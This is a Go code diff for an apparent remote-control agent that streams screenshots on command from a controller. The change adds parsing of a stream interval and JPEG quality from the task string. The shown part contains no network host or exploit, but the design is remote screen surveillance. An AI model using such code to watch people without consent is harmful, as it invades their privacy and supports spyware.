@@ -5,8 +5,10 @@ package main
 
 import (
 	"encoding/base64"
+	"fmt"
 	"os"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -26,19 +28,51 @@ func handleScreenshot(task Task, res *TaskResult) {
 }
 
 func handleScreenStreamStart(task Task, res *TaskResult) {
+	intervalSec, quality := parseScreenStreamSettings(task.Command)
 	if !screenStreaming {
 		screenStreaming = true
 		go func() {
 			for screenStreaming {
-				data, err := takeScreenshotJPEG(65)
+				data, err := takeScreenshotJPEG(quality)
 				if err == nil {
 					sendScreenFrame(data)
 				}
-				time.Sleep(150 * time.Millisecond)
+				time.Sleep(time.Duration(intervalSec) * time.Second)
 			}
 		}()
 	}
-	res.Output = "screen stream started"
+	res.Output = fmt.Sprintf("screen stream started (interval=%ds quality=%d)", intervalSec, quality)
+}
+
+func parseScreenStreamSettings(command string) (intervalSec int, quality int) {
+	intervalSec = 5
+	quality = 65
+	command = strings.TrimSpace(command)
+	if command == "" {
+		return intervalSec, quality
+	}
+	parts := strings.Split(command, ",")
+	if len(parts) >= 1 {
+		if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v > 0 {
+			intervalSec = v
+		}
+	}
+	if len(parts) >= 2 {
+		q := strings.TrimSpace(strings.ToLower(parts[1]))
+		switch q {
+		case "high":
+			quality = 85
+		case "medium":
+			quality = 65
+		case "low":
+			quality = 40
+		default:
+			if v, err := strconv.Atoi(q); err == nil && v > 0 && v <= 100 {
+				quality = v
+			}
+		}
+	}
+	return intervalSec, quality
 }
 
 func handleScreenStreamStop(task Task, res *TaskResult) {
